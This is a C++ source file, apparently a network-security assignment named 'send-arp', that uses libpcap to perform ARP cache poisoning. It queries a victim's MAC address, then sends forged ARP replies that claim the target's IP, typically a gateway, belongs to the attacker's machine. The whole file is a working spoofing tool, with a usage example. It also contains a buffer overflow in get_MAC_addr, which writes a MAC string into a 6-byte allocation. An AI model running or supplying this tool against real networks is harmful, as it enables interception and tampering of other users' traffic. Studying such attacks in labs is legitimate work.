#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
// newly added
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>

char* my_MAC;
char* my_IP;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

/* ==================================================
 *	disclaimer:
 *	get_IP_addr() and get_MAC_addr() are not my code
 */
char* get_IP_addr(char *interface);
char* get_MAC_addr(char *interface);
// ==================================================

void arp_poison(char* sender_ip, char* target_ip, pcap_t* handle);


int main(int argc, char* argv[]) {
	if (argc < 4 | argc%2 != 0 ) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	my_MAC = get_MAC_addr(dev);
	my_IP = get_IP_addr(dev);

	for(int i = 2; i < argc; i += 2) {
		char *sender_ip = argv[i];
		char *target_ip = argv[i+1];

		arp_poison(sender_ip, target_ip, handle);
	}

	pcap_close(handle);
	return 0;
}


void arp_poison(char* sender_ip, char* target_ip, pcap_t* handle) {
	printf(">> poisoning %s -> %s\n", sender_ip, target_ip);

	/* Phase1: fabricate ARP request to obtain sender's MAC address */
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(my_MAC);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_MAC);
	packet.arp_.sip_ = htonl(Ip(my_IP));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(sender_ip));

	// send ARP req pkt
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	/* Phase2: wait for ARP reply and send false ARP reply */
	while(1) {
		// rcv ARP reply pkt
		pcap_pkthdr* header;
		const u_char* packet;

		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			exit(-1);
		}

		// parse rcved packet
		EthHdr* eth_hdr = (EthHdr*) packet;
		ArpHdr* arp_hdr = (ArpHdr*) (packet + sizeof(EthHdr));

		// appropriate action on ARP reply from sender
		if ((uint32_t) (arp_hdr->sip_) == htonl(Ip(sender_ip))		// from sender?
				&& ntohs(eth_hdr->type_) == EthHdr::Arp				// ARP?
					&& ntohs(arp_hdr->op_) == ArpHdr::Reply) {		// ARP reply?

			// forge ARP poison packet
			EthArpPacket packet2;
			packet2.eth_.dmac_ = eth_hdr->smac_;
			packet2.eth_.smac_ = Mac(my_MAC);
			packet2.eth_.type_ = htons(EthHdr::Arp);

			packet2.arp_.hrd_ = htons(ArpHdr::ETHER);
			packet2.arp_.pro_ = htons(EthHdr::Ip4);
			packet2.arp_.hln_ = Mac::SIZE;
			packet2.arp_.pln_ = Ip::SIZE;
			packet2.arp_.op_ = htons(ArpHdr::Reply);
			packet2.arp_.smac_ = Mac(my_MAC);
			packet2.arp_.sip_ = htonl(Ip(target_ip));
			packet2.arp_.tmac_ = eth_hdr->smac_;
			packet2.arp_.tip_ = htonl(Ip(sender_ip));

			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet2), sizeof(EthArpPacket));
	
			if(res != 0){
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}

			printf("ARP poison request sent!\n");
			return;
		}
		// else printf("irrelevant packet; proceeding...\n");
	}
	return;
}

char* get_IP_addr(char *interface){
    struct ifreq ifr;
    char *ip = (char*)malloc(sizeof(char)*40);
    int s;

	s = socket(AF_INET, SOCK_DGRAM, 0); 
	strncpy(ifr.ifr_name, interface, IFNAMSIZ); 
	
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) { 
		printf("Interface Error"); 
        exit(-1);
	}

    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip,sizeof(struct sockaddr)); 

    close(s);

    return ip;
}

char* get_MAC_addr(char *interface){
	struct ifreq ifr;
	int s; 
    unsigned char *temp;
	char *hwaddr = (char *)malloc(sizeof(char)*6);

	s = socket(AF_INET, SOCK_DGRAM, 0); 
	strncpy(ifr.ifr_name, interface, IFNAMSIZ); 

	if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) { 
		printf("Interface Error"); 
        exit(-1);
	}
    
    temp = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    sprintf(hwaddr, "%2.2X:%2.2X:%2.2X:%2.2X:%2.2X:%2.2X\n",temp[0],temp[1],temp[2],temp[3],temp[4],temp[5]);

    close(s);
    return hwaddr;
}
